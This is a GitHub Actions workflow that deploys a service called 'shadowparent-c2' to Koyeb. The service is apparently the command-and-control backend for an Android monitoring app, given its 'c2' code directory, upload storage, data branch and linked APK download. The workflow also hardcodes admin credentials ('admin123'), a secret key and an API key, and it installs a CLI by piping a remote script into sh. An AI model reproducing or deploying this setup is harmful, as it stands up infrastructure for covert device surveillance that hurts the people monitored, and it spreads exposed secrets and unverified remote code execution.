name: Deploy to Koyeb

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Install Koyeb CLI
        run: |
          curl -fsSL https://cli.koyeb.com/install.sh | sh
          echo "$HOME/.koyeb/bin" >> $GITHUB_PATH
      
      - name: Deploy to Koyeb
        env:
          KOYEB_TOKEN: ${{ secrets.KOYEB_TOKEN }}
        run: |
          koyeb app init shadowparent-c2 || true
          koyeb service create shadowparent-c2 \
            --git github.com/palcinkoo/shadowparent-dashboard \
            --git-branch main \
            --git-build-command "pip install -r c2/requirements.txt" \
            --git-run-command "gunicorn --chdir c2 --bind 0.0.0.0:\$PORT --workers 1 --timeout 120 app:app" \
            --env SECRET_KEY=sp-shadowparent-secret-key-2026 \
            --env ADMIN_USER=admin \
            --env ADMIN_PASS=admin123 \
            --env API_KEY=sk-xt-SYCBXIBUe9SkyuIihWQWGLEd \
            --env GH_REPO=palcinkoo/shadowparent-dashboard \
            --env GH_BRANCH=c2data \
            --env GH_TOKEN=${{ secrets.GH_TOKEN }} \
            --env DB_PATH=/tmp/sp.db \
            --env UPLOAD_DIR=/tmp/sp_uploads \
            --env APK_URL=https://github.com/palcinkoo/shadowparent-dashboard/releases/download/v1.2.9/android_UI.apk \
            --ports 8000:http \
            --region fra || true
